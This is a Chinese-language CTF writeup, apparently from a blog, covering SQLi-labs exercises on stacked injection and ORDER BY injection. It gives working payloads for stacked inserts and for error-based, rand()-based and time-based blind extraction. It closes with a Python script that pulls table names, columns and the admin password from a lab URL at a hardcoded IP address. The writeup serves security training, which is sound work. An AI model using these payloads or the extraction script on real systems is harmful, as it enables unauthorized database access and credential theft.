---
title: SQLi-labs Stacked Injection
tags:
  - Writeup
  - CTF
date: 2019-05-25 17:25:00
---

## Stacked injection*

堆叠注入(Stacked injection)，简而言之就是通过在可控输入点传送恶意语句从而执行多条(任意)SQL语句的注入方式。

- 原理: 使用分隔符(;)来表示一条sql语句的结束，插入新的执行语句。
- 局限性: 并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序，同时堆叠注入产生的错误或结果一般不能在前端环境获取回显信息。

与联合注入(Union injection)的区别在于联合注入的语句类型有限，一般用来执行查询语句，而堆叠注入可执行任意语句。支持堆叠查询的服务：

|             | SQL Server | MySQL | PostgreSQL | Oracle | MS Access |
| :---------: | :--------: | :---: | :--------: | :----: | :-------: |
|   **ASP**   |     √      |       |            |        |     ×     |
| **ASP.NET** |     √      |       |            |        |     ×     |
|   **PHP**   |     √      |       |     √      |        |     ×     |
|  **JAVA**   |            |       |            |   ×    |     ×     |



## Less 38

Description: GET / Stacked Query Injection / String

Payload:

```sql
?id=1';insert into users(id,username,password) values ('40','test','hello world')--+
# id = 40
# Your Username is : test
# Your Password is : hello world
```



## Order by injection

```sql
$sql = "SELECT * FROM users ORDER BY $sort";
```

参见`MySQL SELECT`格式规范:

```sql
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
      [PARTITION partition_list]
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}, ... [WITH ROLLUP]]
    [HAVING where_condition]
    [WINDOW window_name AS (window_spec)
        [, window_name AS (window_spec)] ...]
    [ORDER BY {col_name | expr | position} #字段名/表达式/字段的位置(整形)
      [ASC | DESC], ... [WITH ROLLUP]] #修饰符升序ASC(默认)/降序DESC
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR {UPDATE | SHARE} [OF tbl_name [, tbl_name] ...] [NOWAIT | SKIP LOCKED] 
      | LOCK IN SHARE MODE]]
```

常见的注入方式:

**1.Blind based**

- 字段名已知

  if(1<2, id, username), 条件判断后需要选择字段名，而不能是字段的位置，因为IF函数中整形数据会以字符的形式返回，如if(true, 1, 2)将返回'1', **order by 'xxx' 时将按默认排列显示结果**。

  ```sql
  # case when
  CASE when(true) then id else username end
  # if
  if((select ascii(substr(group_concat(table_name), %d, 1)) \
  from information_schema.tables where table_schema=database())%s%d, id, username)
  ```

- 字段名未知

  **(1)触发mysql错误进行盲注**

  ```sql
  # if cur_database[0] = 'a' -> false -> 
  # select x -> Unknown column 'x' in 'field list' -> Error
  if(ascii(substr((select database()), 1, 1))!=97, 1, (select x))
  ```

  此时即可根据查询结果是否为空，来判断条件的真假。

  **(2)基于时间的盲注**

  ```sql
  1 and if(ascii(substr((select database()), 1, 1))=97, sleep(3), 1)
  ```

  **(3)基于rand()的盲注**

  ```sql
  mysql> select * from users order by rand(1) / rand(0);
  +----+----------+------------+                +----+----------+------------+
  | id | username | password   |                | id | username | password   |
  +----+----------+------------+                +----+----------+------------+
  | 11 | admin3   | admin3     |                |  1 | Dumb     | Dumb       |
  |  5 | stupid   | stupidity  |                |  7 | batman   | mob!le     |
  |  4 | secure   | crappy     |                |  4 | secure   | crappy     |
  |  3 | Dummy    | p@ssword   |                | 12 | dhakkan  | dumbo      |
  | 12 | dhakkan  | dumbo      |                |  8 | admin    | admin      |
  |  9 | admin1   | admin1     |                |  2 | Angelina | I-kill-you |
  |  8 | admin    | admin      |                |  3 | Dummy    | p@ssword   |
  | 10 | admin2   | admin2     |                |  6 | superman | genious    |
  |  1 | Dumb     | Dumb       |                |  5 | stupid   | stupidity  |
  |  7 | batman   | mob!le     |                | 10 | admin2   | admin2     |
  | 14 | admin4   | admin4     |                | 14 | admin4   | admin4     |
  |  2 | Angelina | I-kill-you |                | 11 | admin3   | admin3     |
  |  6 | superman | genious    |                |  9 | admin1   | admin1     |
  +----+----------+------------+                +----+----------+------------+
  13 rows in set (0.00 sec)                     13 rows in set (0.00 sec)
  ```

  order by rand(true/false)中的true(1)和false(0)会作为rand()的种子生成不同的随机数进行排序，可以根据结构的不同来判断条件为真或假。

  ```sql
  rand(ascii(substr((select database()), 1, 1))=97)
  ```

**2.Error based**

payload:

```sql
# XPATH
(updatexml(1,concat(0x7e,(select database()),0x7e),1))
1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
# XPATH syntax error: '~security~'
```



## Less 46



Description:  GET / Error based / Numeric / Order by clause

sort=1 与 sort=2-1回显相同,**sort**=`1 asc / 1 desc`回显数据排序不同，猜测存在order by注入点~

```php
$id=$_GET['sort'];
$sql = "SELECT * FROM users ORDER BY $id";
```

payload:

```sql
# Error based
updatexml(1,concat(0x7e,(select database()),0x7e),1)
#  XPATH syntax error: '~security~'	
```



## Less 49*



Description: GET / Error based / String / Blind / Order by clause



闭合方式为单引号`'`，这里使用基于时间的盲注，payload如下:



```python
# -*- coding: utf-8 -*-
import time
import requests
from urllib.parse import quote_plus

main_url = 'http://43.247.91.228:84/Less-49/?sort='

# payload
cur_db_name_ = '1\' and if(ascii(substr(database(),%d,1))%s%d, sleep(2), 1)-- '
cur_db_tabs_ = '1\' and if(ascii(substr((select group_concat(table_name) '\
    'from information_schema.tables '\
        'where table_schema=database()), %d, 1))%s%d, sleep(2), 0)-- '
columns_ = '1\' and if(ascii(substr((select group_concat(column_name) '\
    'from information_schema.columns '\
        'where table_schema=database() '\
            'anandd table_name=\'users\'), %d, 1))%s%d, sleep(2), 0)-- '
password_ = '1\' and if(ascii(substr((select password '\
    'from users where username=\'admin\'),%d,1))%s%d, sleep(2), 0)-- '


def check(query_string):
    url = main_url + quote_plus(query_string)
    try:
        html = requests.get(url, timeout=0.15)
    except:
        return True
    return False

def search(payload):
    print('[*]' + payload)
    result = ''
    print('[~]', end = '')
    for i in range(1, 100):
        left = 33
        right = 127
        #binary search
        while left <= right:
            mid = (left + right) // 2
            s = payload % (i, '=', mid)
            if check(s):
                result += chr(mid)
                print(chr(mid), end = '')
                break
            else:
                s = payload % (i, '>', mid)
                if check(s):
                    left = mid + 1
                else:
                    right = mid - 1
        if left > right:
            break
    print()
    return result

if __name__=="__main__":
    cur_db_name = search(cur_db_name_)
    print('[+]current_db:' + cur_db_name)
    cur_db_tabs = search(cur_db_tabs_)
    print('[+]tables:' + cur_db_tabs)
    columns = search(columns_)
    print('[+]users columns:' + columns)
    password = search(password_)
    print('[+]admin password:' + password)
```

